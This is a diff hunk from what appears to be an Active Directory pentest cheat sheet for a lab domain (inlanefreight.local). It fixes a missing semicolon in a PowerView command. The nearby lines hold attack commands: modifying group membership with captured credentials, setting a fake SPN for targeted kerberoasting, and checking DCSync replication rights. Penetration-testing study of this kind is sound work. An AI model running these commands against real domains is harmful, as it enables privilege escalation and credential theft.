@@ -299,7 +299,7 @@ PS C:\> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
 PS C:\> Set-DomainObject -Credential $Cred2 -Identity <username> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 PS C:\> Set-DomainObject -Credential $Cred2 -Identity <username> -Clear serviceprincipalname -Verbose
 PS C:\> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members '<username>' -Credential $Cred2 -Verbose
-PS C:\> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+PS C:\> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"; Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
 PS C:\> Get-NetLocalGroupMember -ComputerName <computer> -GroupName "Remote Desktop Users"\
 PS C:\> Get-DomainGPO | select displayname
 PS C:\> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid
